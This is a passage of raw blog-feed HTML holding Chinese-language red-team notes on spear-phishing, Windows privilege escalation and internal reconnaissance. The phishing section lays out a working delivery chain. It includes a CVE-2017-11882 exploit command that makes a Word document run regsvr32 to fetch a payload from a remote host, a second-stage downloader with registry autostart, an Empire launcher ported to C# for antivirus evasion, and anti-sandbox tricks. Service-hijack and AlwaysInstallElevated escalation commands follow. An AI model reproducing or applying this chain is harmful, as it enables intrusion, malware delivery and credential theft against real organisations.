“点”](对目标进行详尽的信息收集后通过邮件(一切能联系的渠道) 发送精心制作的策略诱导目标打开从而控</span><br><span class="line">制目标的攻击手法)</span><br><span class="line">爆破 &#x2F; 钓取 目标内网入口的各类账号密码</span><br></pre></td></tr></table></figure><ul><li>vpn 登录口<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">选择它,主要还是因为大部分情况下都可以直接通过它深入目标内网</span><br><span class="line">当然,这其中还包括 vpn 自身的一些高危漏洞利用</span><br><span class="line">Pulse Secure SSL VPN [ CVE-2019-11510]</span><br><span class="line">Fortinet VPN [ CVE-2018-13379]</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li>mail 登陆口<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">主指 owa,绝大部分可直接通过它深入目标核心办公网</span><br><span class="line">部分邮件账号密码和vpn的账号密码都是通用的</span><br><span class="line">从邮箱中也可从中获取大量的内部敏感资料[比如各类账号密码,业务信息],为下一步发信提</span><br><span class="line">供一手写信材料</span><br><span class="line">另外,就是关于各类邮件组件和webmail程序自身的一些漏洞利用,比如 owa[CVE-2018-</span><br><span class="line">8581],core</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li>oa 登陆口<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">除了弱口令之外,还包括oa程序自身的一些已知漏洞利用</span><br><span class="line">这些地方通常也都直通目标内网</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h5 id="邮件打法-1"><a href="#邮件打法-1" class="headerlink" title="邮件打法"></a>邮件打法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">批量发送木马信 [ 注:此处指的是“鱼叉”,非定向]</span><br><span class="line">批量验证邮箱</span><br><span class="line">发信平台部署</span><br><span class="line">基于探针平台的信息搜集</span><br><span class="line">突破目标邮箱网关的问题</span><br><span class="line">炮灰马 [冲锋马,主要目的还是为了钓目标机,没有太多隐匿性要求]</span><br><span class="line">功能 [cmd,文件管理,探针搜集]</span><br><span class="line">穿透性 [加密,隧道,第三方C2... ]</span><br><span class="line">投递方式 [给压缩包链接,避免样本被过早上传分析]</span><br><span class="line">触发方式 [0day&#x2F;1day,宏,lnk,chm,自解压,传统捆绑...]</span><br><span class="line">长控马 [后期稳控,功能不多,侧重在反溯源 ]</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="关于其它的一些“点”-以及大致的打法"><a href="#关于其它的一些“点”-以及大致的打法" class="headerlink" title="关于其它的一些“点”?以及大致的打法?"></a>关于其它的一些“点”?以及大致的打法?</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">边界设备打法[弱口令、已知高危exp 利用、VPN、gre隧道等]</span><br><span class="line">路由、交换、防火墙F5、802无线...</span><br><span class="line">目标上游供应链打法[ 过程漫长,成本巨大]</span><br><span class="line">即前面所有技术的综合应用,只不过不是正面打进去而是绕路迂回进去的</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">专门针对云平台的打法 [ 需要对对应平台的业务逻辑非常了解]</span><br><span class="line">国内:阿里云、腾讯云...</span><br><span class="line">境外:亚马逊云、谷歌云、微软云...等等等 ...</span><br></pre></td></tr></table></figure><h5 id="为什么要去研究邮件"><a href="#为什么要去研究邮件" class="headerlink" title="为什么要去研究邮件?"></a>为什么要去研究邮件?</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">常规Web 渗透当前所面临的一些现实问题?</span><br><span class="line">现如今针对Web 的各种常规入侵防御已日趋完善,加之边界层层纵深防御,突破难度较大</span><br><span class="line">当前Webshell处在目标Dmz,而dmz 和核心办公网又单向隔离很难正面突破</span><br><span class="line">堡垒机无法有效突破</span><br><span class="line">通过Web 已无法直接接触及目标核心,对用户造成的实际威胁感并不大</span><br><span class="line">比如:很多目标Web直接托管部署在云上 与本地办公内网可能完全脱离</span><br><span class="line">渗透web 所耗费的时间,人力成本巨大,因目标而异,渗透周期相对漫长,不够高效</span><br><span class="line">等等...</span><br><span class="line">Web &#x3D;&#x3D; 永远的后门</span><br></pre></td></tr></table></figure><h5 id="为什么要研究邮件"><a href="#为什么要研究邮件" class="headerlink" title="为什么要研究邮件"></a>为什么要研究邮件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">相对于web,邮件更容易直接触及到目标核心内网</span><br><span class="line">目标办公内网一般都会聚集着大量的核心敏感资料,邮件是最直接可靠的深入方式</span><br><span class="line">因为涉及到泄密和长期的监控潜伏,对目标的实际威胁感更大</span><br><span class="line">相对更高效,时间人力成本较低,不用在初始入口权限获取上浪费太多时间</span><br><span class="line">相对于web,邮件更加的隐蔽,更合适用于一些红队[ 或apt行动中]</span><br><span class="line">在搞web的过程中肯定会涉及到大量的扫描探测动作,势必会在目标机器上留下大量的</span><br><span class="line">log</span><br><span class="line">而邮件无非就是一封邮件最多再附送一个样本而已,进一步缩小了对方可依据的回溯渠</span><br><span class="line">道</span><br><span class="line">...</span><br><span class="line">发信 &#x3D;&#x3D; “简单” [其它是最有技术含量的]、直接、高效</span><br></pre></td></tr></table></figure><h5 id="什么是红队"><a href="#什么是红队" class="headerlink" title="什么是红队?"></a>什么是红队?</h5>发信所面临的一些现实问题<br>由于信的内容不到位,目标死活就不点,反而容易打草惊蛇 邮件为网关规则无法突破,信直<br>接过不去,连垃圾箱都进不了 目标办公网物理脱网流量完全不可出,马根本无法上线<br>等等等。。。<h4 id="应用场景及优缺点"><a href="#应用场景及优缺点" class="headerlink" title="应用场景及优缺点"></a>应用场景及优缺点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.常用攻击手法未能有效突破目标</span><br><span class="line">2.有较好的资源储备(漏洞),且信息收集较为充分</span><br><span class="line">优点:(1)上线之后的环境相较于传统入侵方式更容易到达目的地。</span><br><span class="line">(2)分工明确,协同工作效率极高。</span><br><span class="line">缺点:(1)信息收集与策略制定需要花费很长时间,且需要很强的免杀支撑。</span><br><span class="line">(2)样本易被捕获,生存周期短。</span><br></pre></td></tr></table></figure><h5 id="Phishing"><a href="#Phishing" class="headerlink" title="Phishing:"></a>Phishing:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.鱼叉式钓鱼附件:附件有许多选项,例如Microsoft Office文档,可执行文件,PDF或存档文件。打开</span><br><span class="line">附件,攻击者的恶意代码会利用漏洞或直接在用户的系统上执行。</span><br><span class="line">2.鱼叉式钓鱼链接:它与其他形式的鱼叉式网络钓鱼不同之处在于它使用链接来下载电子邮件中包含的</span><br><span class="line">恶意软件,而不是将恶意文件附加到电子邮件本身,以躲避邮件网关的检测。通常,攻击者会对目标发</span><br><span class="line">送策略完美的邮件正文和主题,并要求用户主动单击下载执行URL中的文件,从而利用用户执行。或被</span><br><span class="line">访问的网站可能使用漏洞攻击来破坏Web浏览器,执行恶意代码。</span><br></pre></td></tr></table></figure><h5 id="策略选择"><a href="#策略选择" class="headerlink" title="策略选择"></a>策略选择</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.热门话题 (关于目标,或者目标利益相关)</span><br><span class="line">2.分析人物画像,攻击其软肋(兴趣,忌惮,生活必需)。</span><br><span class="line">3.若存在联系人互发的条件,可考虑替换原文件</span><br></pre></td></tr></table></figure><h5 id="投递方式"><a href="#投递方式" class="headerlink" title="投递方式"></a>投递方式</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">通过邮件网关检测</span><br><span class="line">附件带密码,密码写在正文(成功率低)</span><br><span class="line">office漏洞执行命令</span><br><span class="line">pe文件 (伪装文档,自解压)</span><br><span class="line">伪造云附件,木马在攻击者服务器</span><br><span class="line">二维码投递(手机马)</span><br><span class="line">钓鱼钓取邮件账号密码</span><br></pre></td></tr></table></figure><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><h5 id="实现-1"><a href="#实现-1" class="headerlink" title="实现(1)"></a>实现(1)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.漏洞执行命令: regsvr32 &#x2F;u &#x2F;s &#x2F;i :http:&#x2F;&#x2F;192.168.3.92:8080&#x2F;test.png scrobj.dll</span><br><span class="line">恶意poc构造: python 11882.py -c &quot;regsvr32 &#x2F;u &#x2F;s &#x2F;i:http:&#x2F;&#x2F;192.168.3.92:8080&#x2F;test.png scrobj.dll&quot; -</span><br><span class="line">o test.doc</span><br></pre></td></tr></table></figure><h5 id="实现-2"><a href="#实现-2" class="headerlink" title="实现(2)"></a>实现(2)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">2、text.png为xml文档,内嵌js脚本。生成步骤为:</span><br><span class="line">(1)c#编写,功能为下载http:&#x2F;&#x2F;192.168.3.92:8080&#x2F;ole.gif转储为exe,并在HKCU下的run键值中添加</span><br><span class="line">自启动。</span><br><span class="line">(2)将c#代码编译为exe,通过DotNetTojScript将exe转为js代码</span><br><span class="line">(3)将js代码嵌入xml文档,用</span><br><span class="line">python 11882.py -c &quot;regsvr32 &#x2F;u &#x2F;s &#x2F;i:http:&#x2F;&#x2F;192.168.3.92:8080&#x2F;test.png</span><br><span class="line">scrobj.dll&quot; -o test.doc</span><br><span class="line">生成文档。</span><br></pre></td></tr></table></figure><h5 id="实现-3"><a href="#实现-3" class="headerlink" title="实现(3)"></a>实现(3)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">3、ole.gif为c#编写的exe文件</span><br><span class="line">先用empire launcher powershell 生成powershell上线代码</span><br><span class="line">对powershell代码进行base64解密,从中提取到server信息,target目录,session值,rc4 key</span><br><span class="line">将powershell代码复写为c#代码</span><br><span class="line">(编译c#代码时为考虑操作系统.net版本差异性,可用costura将依赖项打包)</span><br></pre></td></tr></table></figure>参考:<a href="https://plaintext.do/AV-Evasion-Converting-PowerEmpire-Stage-1-to-CSharp-En/">https://plaintext.do/AV-Evasion-Converting-PowerEmpire-Stage-1-to-CSharp-En/</a><br><a href="https://github.com/Ridter/CVE-2017-11882">https://github.com/Ridter/CVE-2017-11882</a></li></ul><p><img src="/images/pasted-108.png" alt="upload successful"></p><h4 id="反沙盒"><a href="#反沙盒" class="headerlink" title="反沙盒"></a>反沙盒</h4><h5 id="反沙盒-c-c-go-perl-ps-py-ruby"><a href="#反沙盒-c-c-go-perl-ps-py-ruby" class="headerlink" title="反沙盒: (c#,c,go,perl,ps,py,ruby)"></a>反沙盒: (c#,c,go,perl,ps,py,ruby)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Arvanaghi&#x2F;CheckPlease</span><br><span class="line">原理:通过判断计算机mac地址,cpu核心,进程名,时区,进程调用dll,注册表,虚拟机文件等选项</span><br><span class="line">判断是否为沙箱环境。</span><br><span class="line">思路:</span><br><span class="line">(1) 可在注册表,wmi属性,系统临时目录等加密存储一个固定字符串(如计算机mac地址),若载</span><br><span class="line">荷对该存储位置解密后的结果不等于当前mac地址,则不执行。</span><br><span class="line">(2)利用沙箱的加速效果,首先向ntp服务器获取时间,再sleep 3分钟,再获取时间,如果存在时间</span><br><span class="line">差,则不执行。</span><br></pre></td></tr></table></figure><h5 id="Execute"><a href="#Execute" class="headerlink" title="Execute"></a>Execute</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">系统、版本、隐蔽性</span><br><span class="line">不同环境采用不同的执行方式,在受限环境可利用系统组件或合法程序执行加载恶意代码,从而突破系</span><br><span class="line">统限制或隐藏自身,达到木马顺利运行的目的。比如在Windows环境使用系统内置程序PowerShell执</span><br><span class="line">行脚本,恶意代码仅存在于内存中,文件不落地,类似可使用的执行方式非常多。</span><br><span class="line">使用自带软件、微软签名Bypass Uac</span><br><span class="line">bitsadmin、regsvr32.exe、rundll32.exe、certutil.exe、schtasks.exe、DiskShadow、CMSTP.exe、</span><br><span class="line">Powershell.exe、Mshta、wmic、Odbcconf、MSBUILD、Msiexec、csc+installutil 降权启动</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 加密 hasdes@123 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透-权限提升</title>
      <link href="2021/06/23/nei-wang-shen-tou-quan-xian-ti-sheng/"/>
      <url>2021/06/23/nei-wang-shen-tou-quan-xian-ti-sheng/</url>
      
        <content type="html"><![CDATA[<h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><ul><li>Windows 单击权限提升</li><li>Bypass UAC</li><li>Bypass AppLocker</li></ul><h4 id="Windows-单击权限提升"><a href="#Windows-单击权限提升" class="headerlink" title="Windows 单击权限提升"></a>Windows 单击权限提升</h4><ul><li>EXP提权</li><li>Unquoted service Path 提权</li><li>不安全的服务权限</li><li>AlwayslnstallElevated</li><li>通过利用弱文件夹权限来提升特权</li><li>无人值守安装</li><li>任务计划程序的特权升级</li><li>DLL劫持</li></ul><h5 id="Windows提权命令大全"><a href="#Windows提权命令大全" class="headerlink" title="Windows提权命令大全"></a>Windows提权命令大全</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">systeminfo  打印系统信息</span><br><span class="line">whoami获得当前用户名</span><br><span class="line">whoami &#x2F;priv当前账户权限</span><br><span class="line">net user列出用户</span><br><span class="line">net user UserName关于用户的信息</span><br><span class="line">net localgroup列出所有组</span><br><span class="line">tasklist &#x2F;svc列出服务任务</span><br><span class="line">net start 列出启动的服务</span><br><span class="line">sc query列出所有服务</span><br><span class="line">sc qc ServiceName  找到指定服务的路径</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="EXP提权"><a href="#EXP提权" class="headerlink" title="EXP提权"></a>EXP提权</h5><ul><li>检查</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line">post&#x2F;windows&#x2F;gather&#x2F;enum_patches</span><br><span class="line">Windows-Exploit-Suggester</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SecWiki&#x2F;windows-kernel-exploits</span><br><span class="line">https:&#x2F;&#x2F;www.exploit-db.com&#x2F;local&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;pentestlab.blog&#x2F;2017&#x2F;04&#x2F;24&#x2F;windows-kernel-exploits&#x2F;</span><br></pre></td></tr></table></figure><h5 id="常见提权EXP"><a href="#常见提权EXP" class="headerlink" title="常见提权EXP"></a>常见提权EXP</h5><p><img src="/images/pasted-74.png" alt="upload successful"></p><p><a href="https://github.com/SecWiki/windows-kernel-exploits">windows提权exp—-gogo</a></p><p><a href="https://github.com/SecWiki/linux-kernel-exploits">linux提权exp—–gogo</a></p><h5 id="通过利用弱文件夹权限来提升特权"><a href="#通过利用弱文件夹权限来提升特权" class="headerlink" title="通过利用弱文件夹权限来提升特权"></a>通过利用弱文件夹权限来提升特权</h5><ul><li>确定写入权限:<br>icacls “C:\Program Files”</li></ul><p><img src="/images/pasted-75.png" alt="upload successful"></p><ul><li>“M” 表示修改</li><li>“F” 代表完全控制</li><li>“CI” 代表从属容器将继承访问控制项</li><li>“OI” 代表从属文件将继承访问控制项</li></ul><p><img src="/images/pasted-76.png" alt="upload successful"></p><h5 id="Unquoted-service-Path-提权"><a href="#Unquoted-service-Path-提权" class="headerlink" title="Unquoted service Path 提权"></a>Unquoted service Path 提权</h5><p><img src="/images/pasted-77.png" alt="upload successful"></p><h5 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h5><p><img src="/images/pasted-78.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查找用户可以修改的服务:accesschk.exe -uwcqv &quot;user&quot; *</span><br><span class="line">查询服务: sc qc &quot;Service&quot;改服务的BINPATH:sc config “Vulnerable” binpath&#x3D;&quot;c:\mailcious.exe&quot;</span><br><span class="line">sc stop &quot;Vulnerble&quot;</span><br><span class="line">sc start &quot;Vulnerble&quot;</span><br><span class="line">MS12 - 020</span><br><span class="line">accesschk.exe -uwcqv &quot;Everyone&quot;</span><br><span class="line">accesschk.exe -uwcqv &quot;Authenticated Users&quot;</span><br><span class="line">accesschk.exe -uwcqv &quot;Users&quot;</span><br></pre></td></tr></table></figure><h5 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h5><p>MSI</p><p>非授权用户以SYSTEM权限运行安装文件(MSI)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查询:</span><br><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</span><br><span class="line">执行</span><br><span class="line">msiexec &#x2F;quiet &#x2F;qn &#x2F;i C:\msi.msi</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-79.png" alt="upload successful"></p><h5 id="无人值守安装"><a href="#无人值守安装" class="headerlink" title="无人值守安装"></a>无人值守安装</h5><p><img src="/images/pasted-80.png" alt="upload successful"></p><h5 id="任务计划程序的特权升级"><a href="#任务计划程序的特权升级" class="headerlink" title="任务计划程序的特权升级"></a>任务计划程序的特权升级</h5><p><img src="/images/pasted-81.png" alt="upload successful"></p><p>JuicyPotato</p><p><img src="/images/pasted-82.png" alt="upload successful"></p><ul><li>本地支持RPC或远程服务器支持PRC并能成功登录</li><li>用户支持Selmpersonate或SeAssignPrimaryToken权限</li><li>开启DCOM</li><li>可用的COM对象</li><li><a href="http://ohpe.it/juicy-potato/CLSID/">http://ohpe.it/juicy-potato/CLSID/</a></li></ul><h5 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h5><p><img src="/images/pasted-83.png" alt="upload successful"></p><p><img src="/images/pasted-84.png" alt="upload successful"></p><p><img src="/images/pasted-85.png" alt="upload successful"></p><p><img src="/images/pasted-86.png" alt="upload successful"></p><h5 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h5><p><img src="/images/pasted-87.png" alt="upload successful"></p><p><img src="/images/pasted-88.png" alt="upload successful"></p><h5 id="PowerUpSQL"><a href="#PowerUpSQL" class="headerlink" title="PowerUpSQL"></a>PowerUpSQL</h5><p><img src="/images/pasted-89.png" alt="upload successful"></p><h4 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h4><p><img src="/images/pasted-90.png" alt="upload successful"></p><h5 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h5><p><img src="/images/pasted-91.png" alt="upload successful"></p><h5 id="SRP"><a href="#SRP" class="headerlink" title="SRP"></a>SRP</h5><p><img src="/images/pasted-92.png" alt="upload successful"></p><p><img src="/images/pasted-93.png" alt="upload successful"></p><h5 id="AppLocker-应用锁"><a href="#AppLocker-应用锁" class="headerlink" title="AppLocker(应用锁)"></a>AppLocker(应用锁)</h5><p><img src="/images/pasted-94.png" alt="upload successful"></p><p><img src="/images/pasted-95.png" alt="upload successful"></p><h5 id="Bypass-Applocker-List"><a href="#Bypass-Applocker-List" class="headerlink" title="Bypass Applocker List"></a>Bypass Applocker List</h5><p><img src="/images/pasted-96.png" alt="upload successful"></p><h5 id="Bypass-Applocker-Demo"><a href="#Bypass-Applocker-Demo" class="headerlink" title="Bypass Applocker Demo"></a>Bypass Applocker Demo</h5><p><img src="/images/pasted-97.png" alt="upload successful"></p><h5 id="HTA-Bypass-Applocker"><a href="#HTA-Bypass-Applocker" class="headerlink" title="HTA Bypass Applocker"></a>HTA Bypass Applocker</h5><p><img src="/images/pasted-98.png" alt="upload successful"></p><h5 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM Relay"></a>NTLM Relay</h5><p><img src="/images/pasted-99.png" alt="upload successful"></p><p><img src="/images/pasted-100.png" alt="upload successful"></p><h5 id="Get-Traffic"><a href="#Get-Traffic" class="headerlink" title="Get Traffic"></a>Get Traffic</h5><ul><li>WPA</li><li>DLLMNR\NetBIOS</li><li>IPV6</li></ul><h5 id="NTLM-relay-to-SMB"><a href="#NTLM-relay-to-SMB" class="headerlink" title="NTLM relay to SMB"></a>NTLM relay to SMB</h5><ul><li>Workstation Default Shutdown Sign</li><li>Workgroup Same PassWord</li></ul><h5 id="Find-Disable-SMB-Signing"><a href="#Find-Disable-SMB-Signing" class="headerlink" title="Find Disable SMB Signing"></a>Find Disable SMB Signing</h5><ul><li>python RunFinger.py -i a target or target range</li></ul><p><img src="/images/pasted-101.png" alt="upload successful"></p><h5 id="Get-Net-NTLM-Hash"><a href="#Get-Net-NTLM-Hash" class="headerlink" title="Get Net-NTLM Hash"></a>Get Net-NTLM Hash</h5><ul><li>python Responder.py -i -r -d -wResponder.conf</li></ul><p><img src="/images/pasted-102.png" alt="upload successful"></p><h5 id="Responder-conf"><a href="#Responder-conf" class="headerlink" title="Responder.conf"></a>Responder.conf</h5><p><img src="/images/pasted-103.png" alt="upload successful"></p><h5 id="Relay-Attck"><a href="#Relay-Attck" class="headerlink" title="Relay Attck"></a>Relay Attck</h5><p><img src="/images/pasted-104.png" alt="upload successful"></p><h5 id="Get-NTLM-hash"><a href="#Get-NTLM-hash" class="headerlink" title="Get NTLM hash"></a>Get NTLM hash</h5><ul><li>Impacket</li></ul><p><img src="/images/pasted-105.png" alt="upload successful"></p><h5 id="Relay2SMB-Tools"><a href="#Relay2SMB-Tools" class="headerlink" title="Relay2SMB Tools"></a>Relay2SMB Tools</h5><ul><li>impacket<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbrelayx.py</span><br><span class="line">ntlmrelayx.py</span><br><span class="line">MultiRelay.py</span><br></pre></td></tr></table></figure><h5 id="Mitigate-Relay-Attck"><a href="#Mitigate-Relay-Attck" class="headerlink" title="Mitigate Relay Attck"></a>Mitigate Relay Attck</h5></li></ul><p><img src="/images/pasted-106.png" alt="upload successful"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 加密 hasdes@123 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透-信息收集</title>
      <link href="2021/06/23/nei-wang-shen-tou-xin-xi-shou-ji/"/>
      <url>2021/06/23/nei-wang-shen-tou-xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">网络连接( netstat -ano)</span><br><span class="line">路由表 (route print)</span><br><span class="line">IP端 (192,172, 10)</span><br><span class="line">NEW家族( net view、 net session)</span><br><span class="line">ARP (arp -a)</span><br><span class="line">nbtstat (nbtscan.exe cidr)</span><br><span class="line">ICMP (ping -n 1 ip、ping -c 1 ip)</span><br><span class="line">HOSTS (c:\Windows\system32\drivers\etc\hosts)</span><br><span class="line">DNS Cache ( ipconfig &#x2F;displaydns)</span><br></pre></td></tr></table></figure><h4 id="内网IP收集"><a href="#内网IP收集" class="headerlink" title="内网IP收集"></a>内网IP收集</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ping c段</span><br><span class="line">for &#x2F;l %i in (1,1,255) do @ping 172.16.0.%i -w 1 -n 1 | find &#x2F;i &quot;ttl&quot;</span><br><span class="line">for &#x2F;l %i in (1,1,255) do @ping 192.168.31.%i -w 1 -n 1 | find &#x2F;i &quot;ttl&quot;</span><br><span class="line">ping b段</span><br><span class="line">for &#x2F;I %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find &#x2F;i &quot;ping&quot;</span><br></pre></td></tr></table></figure><h4 id="利用NETBIOS发现主机"><a href="#利用NETBIOS发现主机" class="headerlink" title="利用NETBIOS发现主机"></a>利用NETBIOS发现主机</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.nbtstat(Windows自带命令)</span><br><span class="line">获取目标主机MAC地址</span><br><span class="line">nbtstat -A 192.168.100.200</span><br></pre></td></tr></table></figure><h4 id="扫描指定网段的主机名和网络开放共享"><a href="#扫描指定网段的主机名和网络开放共享" class="headerlink" title="扫描指定网段的主机名和网络开放共享"></a>扫描指定网段的主机名和网络开放共享</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe 192.168.100.1&#x2F;24</span><br><span class="line">SHARING表示开放,DC表示可能是域控</span><br></pre></td></tr></table></figure><h4 id="工作组-域下基础信息收集"><a href="#工作组-域下基础信息收集" class="headerlink" title="工作组/域下基础信息收集"></a>工作组/域下基础信息收集</h4><ul><li>主机信息收集</li><li>搜集本地敏感文件</li><li>域信息收集</li></ul><h5 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">权限(提权、虚拟机)whoami &#x2F;all</span><br><span 